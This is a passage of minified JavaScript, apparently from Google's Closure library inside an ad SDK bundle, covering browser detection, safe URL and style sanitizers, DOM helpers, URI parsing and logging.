          } else b = "7.0";
        } else b = c[1];
        a = b;
      }
    } else a = "";
    return a;
  }
  function Yb() {
    if (Sb()) {
      var a = Pb.brands.find(function (b) {
        return "Internet Explorer" === b.brand;
      });
      if (!a || !a.version) return NaN;
      a = a.version.split(".");
    } else {
      a = Xb();
      if ("" === a) return NaN;
      a = a.split(".");
    }
    return 0 === a.length ? NaN : Number(a[0]);
  }
  ;
  function Zb() {
    return z("iPhone") && !z("iPod") && !z("iPad");
  }
  function $b() {
    return Zb() || z("iPad") || z("iPod");
  }
  ;
  var ac = function (a) {
    ac[" "](a);
    return a;
  };
  ac[" "] = function () {};
  var bc = function (a, b) {
    try {
      return ac(a[b]), !0;
    } catch (c) {}
    return !1;
  };
  var cc = Tb(),
    dc = Ub(),
    ec = z("Edge"),
    fc = ec || dc,
    gc = z("Gecko") && !(Lb(Ob().toLowerCase(), "webkit") && !z("Edge")) && !(z("Trident") || z("MSIE")) && !z("Edge"),
    hc = Lb(Ob().toLowerCase(), "webkit") && !z("Edge"),
    ic;
  a: {
    var jc = "",
      kc = function () {
        var a = Ob();
        if (gc) return /rv:([^\);]+)(\)|;)/.exec(a);
        if (ec) return /Edge\/([\d\.]+)/.exec(a);
        if (dc) return /\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);
        if (hc) return /WebKit\/(\S+)/.exec(a);
        if (cc) return /(?:Version)[ \/]?(\S+)/.exec(a);
      }();
    kc && (jc = kc ? kc[1] : "");
    if (dc) {
      var lc,
        mc = q.document;
      lc = mc ? mc.documentMode : void 0;
      if (null != lc && lc > parseFloat(jc)) {
        ic = String(lc);
        break a;
      }
    }
    ic = jc;
  }
  var nc = ic;
  function oc(a, b, c) {
    for (var d in a) b.call(c, a[d], d, a);
  }
  function pc(a, b) {
    for (var c in a) if (b.call(void 0, a[c], c, a)) return !0;
    return !1;
  }
  function qc(a) {
    var b = [],
      c = 0,
      d;
    for (d in a) b[c++] = a[d];
    return b;
  }
  function rc(a, b) {
    var c = Fa(b),
      d = c ? b : arguments;
    for (c = c ? 0 : 1; c < d.length; c++) {
      if (null == a) return;
      a = a[d[c]];
    }
    return a;
  }
  function sc(a, b) {
    for (var c in a) if (a[c] == b) return !0;
    return !1;
  }
  function tc(a, b) {
    return null !== a && b in a ? a[b] : void 0;
  }
  function uc(a, b, c) {
    b in a || (a[b] = c);
  }
  function vc(a) {
    var b = {},
      c;
    for (c in a) b[c] = a[c];
    return b;
  }
  var wc = "constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");
  function xc(a, b) {
    for (var c, d, e = 1; e < arguments.length; e++) {
      d = arguments[e];
      for (c in d) a[c] = d[c];
      for (var f = 0; f < wc.length; f++) c = wc[f], Object.prototype.hasOwnProperty.call(d, c) && (a[c] = d[c]);
    }
  }
  ;
  var yc,
    zc = function () {
      if (void 0 === yc) {
        var a = null,
          b = q.trustedTypes;
        if (b && b.createPolicy) {
          try {
            a = b.createPolicy("goog#html", {
              createHTML: Pa,
              createScript: Pa,
              createScriptURL: Pa
            });
          } catch (c) {
            q.console && q.console.error(c.message);
          }
          yc = a;
        } else yc = a;
      }
      return yc;
    };
  var Bc = function (a, b) {
    this.h = b === Ac ? a : "";
  };
  Bc.prototype.toString = function () {
    return this.h + "";
  };
  Bc.prototype.Ba = !0;
  Bc.prototype.qa = function () {
    return this.h.toString();
  };
  var Cc = function (a) {
      if (a instanceof Bc && a.constructor === Bc) return a.h;
      Va("expected object of type TrustedResourceUrl, got '" + a + "' of type " + Ea(a));
      return "type_error:TrustedResourceUrl";
    },
    Hc = function (a) {
      var b = eb(Dc);
      if (!Ec.test(b)) throw Error("Invalid TrustedResourceUrl format: " + b);
      var c = b.replace(Fc, function (d, e) {
        if (!Object.prototype.hasOwnProperty.call(a, e)) throw Error('Found marker, "' + e + '", in format string, "' + b + '", but no valid label mapping found in args: ' + JSON.stringify(a));
        d = a[e];
        return d instanceof db ? eb(d) : encodeURIComponent(String(d));
      });
      return Gc(c);
    },
    Fc = /%{(\w+)}/g,
    Ec = RegExp("^((https:)?//[0-9a-z.:[\\]-]+/|/[^/\\\\]|[^:/\\\\%]+/|[^:/\\\\%]*[?#]|about:blank#)", "i"),
    Ac = {},
    Gc = function (a) {
      var b = zc();
      a = b ? b.createScriptURL(a) : a;
      return new Bc(a, Ac);
    };
  var Jc = function (a, b) {
    this.h = b === Ic ? a : "";
  };
  Jc.prototype.toString = function () {
    return this.h.toString();
  };
  Jc.prototype.Ba = !0;
  Jc.prototype.qa = function () {
    return this.h.toString();
  };
  var Kc = function (a) {
      if (a instanceof Jc && a.constructor === Jc) return a.h;
      Va("expected object of type SafeUrl, got '" + a + "' of type " + Ea(a));
      return "type_error:SafeUrl";
    },
    Lc = /^data:(.*);base64,[a-z0-9+\/]+=*$/i,
    Mc = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i,
    Nc = function (a) {
      if (a instanceof Jc) return a;
      a = "object" == typeof a && a.Ba ? a.qa() : String(a);
      Mc.test(a) ? a = new Jc(a, Ic) : (a = String(a).replace(/(%0A|%0D)/g, ""), a = a.match(Lc) ? new Jc(a, Ic) : null);
      return a;
    },
    Oc;
  try {
    new URL("s://g"), Oc = !0;
  } catch (a) {
    Oc = !1;
  }
  var Pc = Oc,
    Qc = function (a) {
      if (a instanceof Jc) return a;
      a = "object" == typeof a && a.Ba ? a.qa() : String(a);
      a: {
        var b = a;
        if (Pc) {
          try {
            var c = new URL(b);
          } catch (d) {
            b = "https:";
            break a;
          }
          b = c.protocol;
        } else b: {
          c = document.createElement("a");
          try {
            c.href = b;
          } catch (d) {
            b = void 0;
            break b;
          }
          b = c.protocol;
          b = ":" === b || "" === b ? "https:" : b;
        }
      }
      x("javascript:" !== b, "%s is a javascript: URL", a) || (a = "about:invalid#zClosurez");
      return new Jc(a, Ic);
    },
    Ic = {},
    Rc = new Jc("about:invalid#zClosurez", Ic);
  var Sc = {},
    Tc = function (a, b) {
      this.h = b === Sc ? a : "";
      this.Ba = !0;
    };
  Tc.prototype.qa = function () {
    return this.h;
  };
  Tc.prototype.toString = function () {
    return this.h.toString();
  };
  var Uc = new Tc("", Sc);
  function Vc(a) {
    if (a instanceof Jc) return 'url("' + Kc(a).replace(/</g, "%3c").replace(/[\\"]/g, "\\$&") + '")';
    a = a instanceof db ? eb(a) : Wc(String(a));
    if (/[{;}]/.test(a)) throw new Sa("Value does not allow [{;}], got: %s.", [a]);
    return a;
  }
  function Wc(a) {
    var b = a.replace(Xc, "$1").replace(Xc, "$1").replace(Yc, "url");
    if (Zc.test(b)) {
      if ($c.test(a)) return Va("String value disallows comments, got: " + a), "zClosurez";
      for (var c = b = !0, d = 0; d < a.length; d++) {
        var e = a.charAt(d);
        "'" == e && c ? b = !b : '"' == e && b && (c = !c);
      }
      if (!b || !c) return Va("String value requires balanced quotes, got: " + a), "zClosurez";
      if (!ad(a)) return Va("String value requires balanced square brackets and one identifier per pair of brackets, got: " + a), "zClosurez";
    } else return Va("String value allows only [-+,.\"'%_!#/ a-zA-Z0-9\\[\\]] and simple functions, got: " + a), "zClosurez";
    return bd(a);
  }
  function ad(a) {
    for (var b = !0, c = /^[-_a-zA-Z0-9]$/, d = 0; d < a.length; d++) {
      var e = a.charAt(d);
      if ("]" == e) {
        if (b) return !1;
        b = !0;
      } else if ("[" == e) {
        if (!b) return !1;
        b = !1;
      } else if (!b && !c.test(e)) return !1;
    }
    return b;
  }
  var Zc = RegExp("^[-+,.\"'%_!#/ a-zA-Z0-9\\[\\]]+$"),
    Yc = RegExp("\\b(url\\([ \t\n]*)('[ -&(-\\[\\]-~]*'|\"[ !#-\\[\\]-~]*\"|[!#-&*-\\[\\]-~]*)([ \t\n]*\\))", "g"),
    Xc = RegExp("\\b(calc|cubic-bezier|fit-content|hsl|hsla|linear-gradient|matrix|minmax|radial-gradient|repeat|rgb|rgba|(rotate|scale|translate)(X|Y|Z|3d)?|steps|var)\\([-+*/0-9a-zA-Z.%#\\[\\], ]+\\)", "g"),
    $c = /\/\*/;
  function bd(a) {
    return a.replace(Yc, function (b, c, d, e) {
      var f = "";
      d = d.replace(/^(['"])(.*)\1$/, function (g, l, m) {
        f = l;
        return m;
      });
      b = (Nc(d) || Rc).qa();
      return c + f + b + f + e;
    });
  }
  ;
  var cd = {},
    dd = function (a, b) {
      this.h = b === cd ? a : "";
      this.Ba = !0;
    };
  dd.prototype.toString = function () {
    return this.h.toString();
  };
  var ed = function (a, b) {
    if (Lb(a, "<")) throw Error("Selector does not allow '<', got: " + a);
    var c = a.replace(/('|")((?!\1)[^\r\n\f\\]|\\[\s\S])*\1/g, "");
    if (!/^[-_a-zA-Z0-9#.:* ,>+~[\]()=\\^$|]+$/.test(c)) throw Error("Selector allows only [-_a-zA-Z0-9#.:* ,>+~[\\]()=\\^$|] and strings, got: " + a);
    a: {
      for (var d = {
          "(": ")",
          "[": "]"
        }, e = [], f = 0; f < c.length; f++) {
        var g = c[f];
        if (d[g]) e.push(d[g]);else if (sc(d, g) && e.pop() != g) {
          c = !1;
          break a;
        }
      }
      c = 0 == e.length;
    }
    if (!c) throw Error("() and [] in selector must be balanced, got: " + a);
    if (!(b instanceof Tc)) {
      c = "";
      for (var l in b) if (Object.prototype.hasOwnProperty.call(b, l)) {
        if (!/^[-_a-zA-Z0-9]+$/.test(l)) throw Error("Name allows only [-_a-zA-Z0-9], got: " + l);
        d = b[l];
        null != d && (d = Array.isArray(d) ? d.map(Vc).join(" ") : Vc(d), c += l + ":" + d + ";");
      }
      b = c ? new Tc(c, Sc) : Uc;
    }
    b instanceof Tc && b.constructor === Tc ? l = b.h : (Va("expected object of type SafeStyle, got '" + b + "' of type " + Ea(b)), l = "type_error:SafeStyle");
    a = a + "{" + l.replace(/</g, "\\3C ") + "}";
    return new dd(a, cd);
  };
  dd.prototype.qa = function () {
    return this.h;
  };
  var fd = {},
    gd = function (a, b) {
      this.h = b === fd ? a : "";
      this.Ba = !0;
    };
  gd.prototype.qa = function () {
    return this.h.toString();
  };
  gd.prototype.toString = function () {
    return this.h.toString();
  };
  var id = function (a, b) {
      xb(a, "SCRIPT");
      var c = hd("script[nonce]", a.ownerDocument && a.ownerDocument.defaultView);
      c && a.setAttribute("nonce", c);
      a.src = Cc(b);
    },
    jd = function (a, b, c, d) {
      a = a instanceof Jc ? a : Qc(a);
      b = b || q;
      c = c instanceof db ? eb(c) : c || "";
      return void 0 !== d ? b.open(Kc(a), c, d) : b.open(Kc(a), c);
    },
    kd = /^[\w+/_-]+[=]{0,2}$/,
    hd = function (a, b) {
      b = (b || q).document;
      return b.querySelector ? (a = b.querySelector(a)) && (a = a.nonce || a.getAttribute("nonce")) && kd.test(a) ? a : "" : "";
    };
  var ld = function (a, b) {
    this.width = a;
    this.height = b;
  };
  h = ld.prototype;
  h.toString = function () {
    return "(" + this.width + " x " + this.height + ")";
  };
  h.aspectRatio = function () {
    return this.width / this.height;
  };
  h.ceil = function () {
    this.width = Math.ceil(this.width);
    this.height = Math.ceil(this.height);
    return this;
  };
  h.floor = function () {
    this.width = Math.floor(this.width);
    this.height = Math.floor(this.height);
    return this;
  };
  h.round = function () {
    this.width = Math.round(this.width);
    this.height = Math.round(this.height);
    return this;
  };
  var md = function (a) {
      return decodeURIComponent(a.replace(/\+/g, " "));
    },
    nd = function (a, b) {
      var c = a;
      0 < a.length && 0 < b && (c = a.slice(0, 0) + a.slice(0 + b));
      return c;
    },
    od = function (a) {
      return null == a ? "" : String(a);
    },
    pd = function (a) {
      for (var b = 0, c = 0; c < a.length; ++c) b = 31 * b + a.charCodeAt(c) >>> 0;
      return b;
    },
    qd = function (a) {
      return String(a).replace(/\-([a-z])/g, function (b, c) {
        return c.toUpperCase();
      });
    },
    rd = function (a) {
      return a.replace(RegExp("(^|[\\s]+)([a-z])", "g"), function (b, c, d) {
        return c + d.toUpperCase();
      });
    };
  var ud = function (a) {
      return a ? new sd(td(a)) : Ra || (Ra = new sd());
    },
    wd = function (a, b) {
      oc(b, function (c, d) {
        c && "object" == typeof c && c.Ba && (c = c.qa());
        "style" == d ? a.style.cssText = c : "class" == d ? a.className = c : "for" == d ? a.htmlFor = c : vd.hasOwnProperty(d) ? a.setAttribute(vd[d], c) : Bb(d, "aria-") || Bb(d, "data-") ? a.setAttribute(d, c) : a[d] = c;
      });
    },
    vd = {
      cellpadding: "cellPadding",
      cellspacing: "cellSpacing",
      colspan: "colSpan",
      frameborder: "frameBorder",
      height: "height",
      maxlength: "maxLength",
      nonce: "nonce",
      role: "role",
      rowspan: "rowSpan",
      type: "type",
      usemap: "useMap",
      valign: "vAlign",
      width: "width"
    },
    xd = function () {
      var a = window.document;
      a = "CSS1Compat" == a.compatMode ? a.documentElement : a.body;
      return new ld(a.clientWidth, a.clientHeight);
    },
    yd = function (a) {
      return a.parentWindow || a.defaultView;
    },
    Ad = function (a, b, c) {
      return zd(document, arguments);
    },
    zd = function (a, b) {
      var c = b[1],
        d = Bd(a, String(b[0]));
      c && ("string" === typeof c ? d.className = c : Array.isArray(c) ? d.className = c.join(" ") : wd(d, c));
      2 < b.length && Cd(a, d, b, 2);
      return d;
    },
    Cd = function (a, b, c, d) {
      function e(l) {
        l && b.appendChild("string" === typeof l ? a.createTextNode(l) : l);
      }
      for (; d < c.length; d++) {
        var f = c[d];
        if (!Fa(f) || u(f) && 0 < f.nodeType) e(f);else {
          a: {
            if (f && "number" == typeof f.length) {
              if (u(f)) {
                var g = "function" == typeof f.item || "string" == typeof f.item;
                break a;
              }
              if ("function" === typeof f) {
                g = "function" == typeof f.item;
                break a;
              }
            }
            g = !1;
          }
          y(g ? qb(f) : f, e);
        }
      }
    },
    Bd = function (a, b) {
      b = String(b);
      "application/xhtml+xml" === a.contentType && (b = b.toLowerCase());
      return a.createElement(b);
    },
    Dd = function (a, b) {
      x(null != a && null != b, "goog.dom.appendChild expects non-null arguments");
      a.appendChild(b);
    },
    Ed = function (a, b) {
      Cd(td(a), a, arguments, 1);
    },
    Fd = function (a) {
      for (var b; b = a.firstChild;) a.removeChild(b);
    },
    Gd = function (a) {
      return a && a.parentNode ? a.parentNode.removeChild(a) : null;
    },
    td = function (a) {
      x(a, "Node cannot be null or undefined.");
      return 9 == a.nodeType ? a : a.ownerDocument || a.document;
    },
    Hd = function (a, b) {
      a && (a = a.parentNode);
      for (var c = 0; a;) {
        x("parentNode" != a.name);
        if (b(a)) return a;
        a = a.parentNode;
        c++;
      }
      return null;
    },
    sd = function (a) {
      this.h = a || q.document || document;
    };
  sd.prototype.getElement = function (a) {
    return "string" === typeof a ? this.h.getElementById(a) : a;
  };
  var Id = function (a, b) {
    a = a.h;
    b = b && "*" != b ? String(b).toUpperCase() : "";
    a.querySelectorAll && a.querySelector && b ? b = a.querySelectorAll(b + "") : b = a.getElementsByTagName(b || "*");
    return b;
  };
  sd.prototype.j = function (a, b, c) {
    return zd(this.h, arguments);
  };
  var Jd = function (a, b) {
    return Bd(a.h, b);
  };
  sd.prototype.l = Dd;
  sd.prototype.contains = function (a, b) {
    if (!a || !b) return !1;
    if (a.contains && 1 == b.nodeType) return a == b || a.contains(b);
    if ("undefined" != typeof a.compareDocumentPosition) return a == b || !!(a.compareDocumentPosition(b) & 16);
    for (; b && a != b;) b = b.parentNode;
    return b == a;
  };
  var Kd = function (a, b, c, d, e, f, g) {
      var l = "";
      a && (l += a + ":");
      c && (l += "//", b && (l += b + "@"), l += c, d && (l += ":" + d));
      e && (l += e);
      f && (l += "?" + f);
      g && (l += "#" + g);
      return l;
    },
    Ld = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$"),
    Md = function (a) {
      var b = a.indexOf("#");
      return 0 > b ? null : a.slice(b + 1);
    },
    Nd = function (a) {
      a = a.match(Ld);
      return Kd(a[1], a[2], a[3], a[4]);
    },
    Od = function (a, b) {
      if (a) {
        a = a.split("&");
        for (var c = 0; c < a.length; c++) {
          var d = a[c].indexOf("="),
            e = null;
          if (0 <= d) {
            var f = a[c].substring(0, d);
            e = a[c].substring(d + 1);
          } else f = a[c];
          b(f, e ? md(e) : "");
        }
      }
    },
    Pd = /#|$/,
    Qd = function (a, b) {
      var c = a.search(Pd);
      a: {
        var d = 0;
        for (var e = b.length; 0 <= (d = a.indexOf(b, d)) && d < c;) {
          var f = a.charCodeAt(d - 1);
          if (38 == f || 63 == f) if (f = a.charCodeAt(d + e), !f || 61 == f || 38 == f || 35 == f) break a;
          d += e + 1;
        }
        d = -1;
      }
      if (0 > d) return null;
      e = a.indexOf("&", d);
      if (0 > e || e > c) e = c;
      d += b.length + 1;
      return md(a.slice(d, -1 !== e ? e : 0));
    };
  var Rd = Object.freeze || function (a) {
    return a;
  };
  var Sd = function (a, b) {
    this.name = a;
    this.value = b;
  };
  Sd.prototype.toString = function () {
    return this.name;
  };
  var Td = new Sd("OFF", Infinity),
    Ud = new Sd("SHOUT", 1200),
    Vd = new Sd("SEVERE", 1E3),
    Wd = new Sd("WARNING", 900),
    Xd = new Sd("INFO", 800),
    Yd = new Sd("CONFIG", 700),
    Zd = new Sd("FINE", 500),
    $d = new Sd("FINER", 400),
    ae = new Sd("FINEST", 300),
    be = new Sd("ALL", 0),
    ce = [Td, Ud, Vd, Wd, Xd, Yd, Zd, $d, ae, be],
    de = null,
    ee = function () {},
    fe,
    ge = function (a, b, c) {
      this.h = void 0;
      this.reset(a || Td, b, c, void 0, void 0);
    };
  ge.prototype.reset = function (a, b, c, d) {
    this.l = d || Na();
    this.o = a;
    this.v = b;
    this.j = c;
    this.h = void 0;
  };
  var he = function (a, b) {
      this.h = null;
      this.o = [];
      this.l = (void 0 === b ? null : b) || null;
      this.v = [];
      this.j = {
        H: function () {
          return a;
        }
      };
    },
    ie = function (a) {
      if (a.h) return a.h;
      if (a.l) return ie(a.l);
      Va("Root logger has no level set.");
      return Td;
    },
    je = function (a, b) {
      for (; a;) a.o.forEach(function (c) {
        c(b);
      }), a = a.l;
    },
    ke = function () {
      this.entries = {};
      var a = new he("");
      a.h = Yd;
      this.entries[""] = a;
    },
    le,
    me = function (a, b) {
      var c = a.entries[b];
      if (c) return c;
      c = me(a, b.slice(0, Math.max(b.lastIndexOf("."), 0)));
      var d = new he(b, c);
      a.entries[b] = d;
      c.v.push(d);
      return d;
    },
    ne = function () {
      le || (le = new ke());
      return le;
    },
    oe = function (a) {
      return me(ne(), a).j;
    },
    pe = function (a, b) {
      a && (me(ne(), a.H()).h = b);
    },
    qe = function (a, b, c, d) {
      var e;
      if (e = a) if (e = a && b) {
        e = b.value;
        var f = a ? ie(me(ne(), a.H())) : Td;
        e = e >= f.value;
      }
      e && (b = b || Td, e = me(ne(), a.H()), "function" === typeof c && (c = c()), fe || (fe = new ee()), a = new ge(b, c, a.H()), a.h = d, je(e, a));
    },
    re = function (a, b) {
      a && qe(a, Vd, b);
    },
    A = function (a, b, c) {
      a && qe(a, Wd, b, c);
    },
    B = function (a, b) {
      a && qe(a, Xd, b);
    },
    se = function (a, b) {
      a && qe(a, Zd, b);
    }; /*
       SPDX-License-Identifier: Apache-2.0
       */
  var te;
  try {
    new URL("s://g"), te = !0;
  } catch (a) {
    te = !1;
  }
  var ue = te,
    ve = [],
    we = function () {};
  xe(function (a) {
    A(oe("safevalues"), "A URL with content '" + a + "' was sanitized away.");
  });
  function xe(a) {
    -1 === ve.indexOf(a) && ve.push(a);
    we = function (b) {
      ve.forEach(function (c) {
        c(b);
      });
    };
  }
  ;
  function ye(a) {
    var b,
      c,
      d = null == (c = (b = (a.ownerDocument && a.ownerDocument.defaultView || window).document).querySelector) ? void 0 : c.call(b, "script[nonce]");
    (b = d ? d.nonce || d.getAttribute("nonce") || "" : "") && a.setAttribute("nonce", b);
  }
  ;
  var ze = function (a) {
      var b = !1;
      b = void 0 === b ? !1 : b;
      var c = void 0 === c ? q : c;
      for (var d = 0; c && 40 > d++;) {
        var e;
        if (!(e = b)) try {
          e = !!c && null != c.location.href && bc(c, "foo");
        } catch (g) {
          e = !1;
        }
        if (e && a(c)) break;
        a: {
          try {
            var f = c.parent;
            if (f && f != c) {
              c = f;
              break a;
            }
          } catch (g) {}
          c = null;
        }
      }
    },
    Ae = function (a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    };
  function Be(a) {
    q.setTimeout(function () {
      throw a;
    }, 0);
  }
  ;
  var Ce = function (a) {
      if (a.Z && "function" == typeof a.Z) return a.Z();
      if ("undefined" !== typeof Map && a instanceof Map || "undefined" !== typeof Set && a instanceof Set) return Array.from(a.values());
      if ("string" === typeof a) return a.split("");
      if (Fa(a)) {
        for (var b = [], c = a.length, d = 0; d < c; d++) b.push(a[d]);
        return b;
      }
      return qc(a);
    },
    De = function (a) {
      if (a.Ha && "function" == typeof a.Ha) return a.Ha();
      if (!a.Z || "function" != typeof a.Z) {
        if ("undefined" !== typeof Map && a instanceof Map) return Array.from(a.keys());
        if (!("undefined" !== typeof Set && a instanceof Set)) {
          if (Fa(a) || "string" === typeof a) {
            var b = [];
            a = a.length;
            for (var c = 0; c < a; c++) b.push(c);
            return b;
          }
          b = [];
          c = 0;
          for (var d in a) b[c++] = d;
          return b;
        }
      }
    },
    Ee = function (a, b) {
      return a.contains && "function" == typeof a.contains ? a.contains(b) : a.Ya && "function" == typeof a.Ya ? a.Ya(b) : Fa(a) || "string" === typeof a ? 0 <= hb(a, b) : sc(a, b);
    };
  var Fe = function (a) {
    this.l = this.A = this.o = "";
    this.B = null;
    this.s = this.h = "";
    this.v = !1;
    var b;
    a instanceof Fe ? (this.v = a.v, Ge(this, a.o), this.A = a.A, this.l = a.l, He(this, a.B), this.h = a.h, Ie(this, Je(a.j)), this.s = a.s) : a && (b = String(a).match(Ld)) ? (this.v = !1, Ge(this, b[1] || "", !0), this.A = Ke(b[2] || ""), this.l = Ke(b[3] || "", !0), He(this, b[4]), this.h = Ke(b[5] || "", !0), Ie(this, b[6] || "", !0), this.s = Ke(b[7] || "")) : (this.v = !1, this.j = new Le(null, this.v));
  };
  Fe.prototype.toString = function () {
    var a = [],
      b = this.o;
    b && a.push(Me(b, Ne, !0), ":");
    var c = this.l;
    if (c || "file" == b) a.push("//"), (b = this.A) && a.push(Me(b, Ne, !0), "@"), a.push(encodeURIComponent(String(c)).replace(/%25([0-9a-fA-F]{2})/g, "%$1")), c = this.B, null != c && a.push(":", String(c));
    if (c = this.h) this.l && "/" != c.charAt(0) && a.push("/"), a.push(Me(c, "/" == c.charAt(0) ? Oe : Pe, !0));
    (c = this.j.toString()) && a.push("?", c);
    (c = this.s) && a.push("#", Me(c, Qe));
    return a.join("");
  };
  Fe.prototype.resolve = function (a) {
    var b = new Fe(this),
      c = !!a.o;
    c ? Ge(b, a.o) : c = !!a.A;
    c ? b.A = a.A : c = !!a.l;
    c ? b.l = a.l : c = null != a.B;
    var d = a.h;
    if (c) He(b, a.B);else if (c = !!a.h) {
      if ("/" != d.charAt(0)) if (this.l && !this.h) d = "/" + d;else {
        var e = b.h.lastIndexOf("/");
        -1 != e && (d = b.h.slice(0, e + 1) + d);
      }
      e = d;
      if (".." == e || "." == e) d = "";else if (Lb(e, "./") || Lb(e, "/.")) {
        d = Bb(e, "/");
        e = e.split("/");
        for (var f = [], g = 0; g < e.length;) {
          var l = e[g++];
          "." == l ? d && g == e.length && f.push("") : ".." == l ? ((1 < f.length || 1 == f.length && "" != f[0]) && f.pop(), d && g == e.length && f.push("")) : (f.push(l), d = !0);
        }
        d = f.join("/");
      } else d = e;
    }
    c ? b.h = d : c = "" !== a.j.toString();
    c ? Ie(b, Je(a.j)) : c = !!a.s;
    c && (b.s = a.s);
    return b;
  };
  var Ge = function (a, b, c) {
      a.o = c ? Ke(b, !0) : b;
      a.o && (a.o = a.o.replace(/:$/, ""));
    },
    He = function (a, b) {
      if (b) {
        b = Number(b);
        if (isNaN(b) || 0 > b) throw Error("Bad port number " + b);
        a.B = b;
      } else a.B = null;
    },
    Ie = function (a, b, c) {
      b instanceof Le ? (a.j = b, Re(a.j, a.v)) : (c || (b = Me(b, Se)), a.j = new Le(b, a.v));
    },
    Ke = function (a, b) {
      return a ? b ? decodeURI(a.replace(/%25/g, "%2525")) : decodeURIComponent(a) : "";
    },
    Me = function (a, b, c) {
      return "string" === typeof a ? (a = encodeURI(a).replace(b, Te), c && (a = a.replace(/%25([0-9a-fA-F]{2})/g, "%$1")), a) : null;
    },
    Te = function (a) {
      a = a.charCodeAt(0);
      return "%" + (a >> 4 & 15).toString(16) + (a & 15).toString(16);
    },
    Ne = /[#\/\?@]/g,
    Pe = /[#\?:]/g,
    Oe = /[#\?]/g,
    Se = /[#\?@]/g,
    Qe = /#/g,
    Le = function (a, b) {
      this.j = this.h = null;
      this.l = a || null;
      this.o = !!b;
    },
    Ue = function (a) {
      a.h || (a.h = new Map(), a.j = 0, a.l && Od(a.l, function (b, c) {
        a.add(md(b), c);
      }));
    };
  Le.prototype.ja = function () {
    Ue(this);
    return this.j;
  };
  Le.prototype.add = function (a, b) {
    Ue(this);
    this.l = null;
    a = Ve(this, a);
    var c = this.h.get(a);
    c || this.h.set(a, c = []);
    c.push(b);
    this.j = Wa(this.j) + 1;
    return this;
  };
  var We = function (a, b) {
    Ue(a);
    b = Ve(a, b);
    a.h.has(b) && (a.l = null, a.j = Wa(a.j) - a.h.get(b).length, a.h.delete(b));
  };
  h = Le.prototype;
  h.ia = function (a) {
    Ue(this);
    a = Ve(this, a);
    return this.h.has(a);
  };
  h.Ya = function (a) {
    var b = this.Z();
    return 0 <= hb(b, a);
  };
  h.forEach = function (a, b) {
    Ue(this);
    this.h.forEach(function (c, d) {
      c.forEach(function (e) {
        a.call(b, e, d, this);
      }, this);
    }, this);
  };
  h.Ha = function () {
    Ue(this);
    for (var a = Array.from(this.h.values()), b = Array.from(this.h.keys()), c = [], d = 0; d < b.length; d++) for (var e = a[d], f = 0; f < e.length; f++) c.push(b[d]);
    return c;
  };
  h.Z = function (a) {
    Ue(this);
    var b = [];
    if ("string" === typeof a) this.ia(a) && (b = b.concat(this.h.get(Ve(this, a))));else {
      a = Array.from(this.h.values());
      for (var c = 0; c < a.length; c++) b = b.concat(a[c]);
    }
    return b;
  };
  h.set = function (a, b) {
    Ue(this);
    this.l = null;
    a = Ve(this, a);
    this.ia(a) && (this.j = Wa(this.j) - this.h.get(a).length);
    this.h.set(a, [b]);
    this.j = Wa(this.j) + 1;
    return this;
  };
  h.get = function (a, b) {
    if (!a) return b;
    a = this.Z(a);
    return 0 < a.length ? String(a[0]) : b;
  };
  h.toString = function () {
    if (this.l) return this.l;
    if (!this.h) return "";
    for (var a = [], b = Array.from(this.h.keys()), c = 0; c < b.length; c++) {
      var d = b[c],
        e = encodeURIComponent(String(d));
      d = this.Z(d);
      for (var f = 0; f < d.length; f++) {
        var g = e;
        "" !== d[f] && (g += "=" + encodeURIComponent(String(d[f])));
        a.push(g);
      }
    }
    return this.l = a.join("&");
  };
  var Je = function (a) {
      var b = new Le();
      b.l = a.l;
      a.h && (b.h = new Map(a.h), b.j = a.j);
      return b;
    },
    Ve = function (a, b) {
      b = String(b);
      a.o && (b = b.toLowerCase());
      return b;
    },
    Re = function (a, b) {
      b && !a.o && (Ue(a), a.l = null, a.h.forEach(function (c, d) {
        var e = d.toLowerCase();
        d != e && (We(this, d), We(this, e), 0 < c.length && (this.l = null, this.h.set(Ve(this, e), qb(c)), this.j = Wa(this.j) + c.length));
      }, a));
      a.o = b;
    };
  var Xe,
    Ye,
    Ze,
    $e,
    af,
    bf,
    cf = function () {
      return q.navigator ? q.navigator.userAgent : "";
    },
    df = function (a) {
      return Lb(cf(), a);
    },
    ef = df("(iPad") || df("(Macintosh") || df("(iPod") || df("(iPhone"),
    ff = df("Android"),
    gf = function () {
      if (void 0 === Xe) {
        var a = /Android\s+([0-9.]+)/.exec(cf());
        Xe = a && 2 == a.length ? a[1] : "";
      }
      return Xe;
    },
    hf = function () {
      if (void 0 === Ze) {
        if (ef) {
          var a = df("Safari");
          var b = new Fe(window.location.href).j.Z("js");
          a: {
            if ((b = b.length ? b[0] : "") && Bb(b, "afma-")) {
              var c = b.lastIndexOf("v");
              if (-1 < c && (b = b.substr(c + 1).match(/^(\d+\.\d+\.\d+|^\d+\.\d+|^\d+)(-.*)?$/))) {
                b = b[1];
                break a;
              }
            }
            b = "0.0.0";
          }
          if (!a || "0.0.0" !== b) return Ze = !0;
        }
        Ze = !1;
      }
      return Ze;
    },
    jf = function () {
      void 0 === $e && ($e = df("afma-sdk-a") ? !0 : !1);
      return $e;
    },
    kf = function () {
      void 0 === af && (af = hf() || jf());
      return af;
    },
    lf = function (a) {
      var b;
      void 0 === bf && (bf = jf() ? (b = cf().match(/afma\-sdk\-a\-v\.?([\d+\.]+)/)) ? b[1] : "" : "");
      return (b = bf) ? 0 <= Nb(b, a) : !1;
    };
  var mf = function (a, b) {
    this.s = Math.random() < a;
    this.A = b;
    this.j = null;
    this.v = "";
  };
  mf.prototype.isActive = function () {
    return this.s;
  };
  mf.prototype.l = function () {
    return this.isActive() && null !== this.j ? (this.A + "//pagead2.googlesyndication.com/pagead/gen_204/?id=" + this.j + this.v).substring(0, 2E3) : "";
  };
  var nf = function () {},
    qf = function (a) {
      of = a | 6;
      pf(of);
    },
    pf = function (a) {
      rf(a, 2, 1);
      rf(a, 1, 2);
      rf(a, 4, 8);
      rf(a, 8, 4);
      rf(a, 128, 64);
      rf(a, 64, 128);
      rf(a, 256, 2);
    },
    rf = function (a, b, c) {
